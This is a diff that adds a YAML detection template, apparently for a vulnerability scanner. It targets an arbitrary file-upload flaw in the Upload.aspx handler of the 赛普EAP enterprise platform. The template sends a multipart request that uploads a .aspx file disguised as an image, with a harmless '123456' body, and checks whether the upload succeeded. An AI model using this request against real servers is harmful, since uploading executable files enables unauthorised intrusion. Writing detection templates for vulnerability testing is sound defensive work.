@@ -1,0 +1,28 @@
+id:
+
+info:
+  name: 赛普EAP企业适配管理平台 Upload.aspx 文件上传
+  severity:
+  description:
+  details:
+  repair:
+requests1:
+  method: GET
+  path: /IDWebSoft/Common/Handler/Upload.aspx
+  headers:
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
+    Content-Type: multipart/form-data;boundary=----WebKitFormBoundaryssh7UfnPpGU7BXfK
+    Upgrade-Insecure-Requests: 1
+    Accept-Encoding: gzip
+  data: |
+    ------WebKitFormBoundaryssh7UfnPpGU7BXfK
+    Content-Disposition: form-data; name="Filedata"; filename="test1.aspx"
+    Content-Type: image/png
+
+    123456
+    ------WebKitFormBoundaryssh7UfnPpGU7BXfK--
+response1:
+  body: .aspx
+  code: 200
+requests2:
+response2:
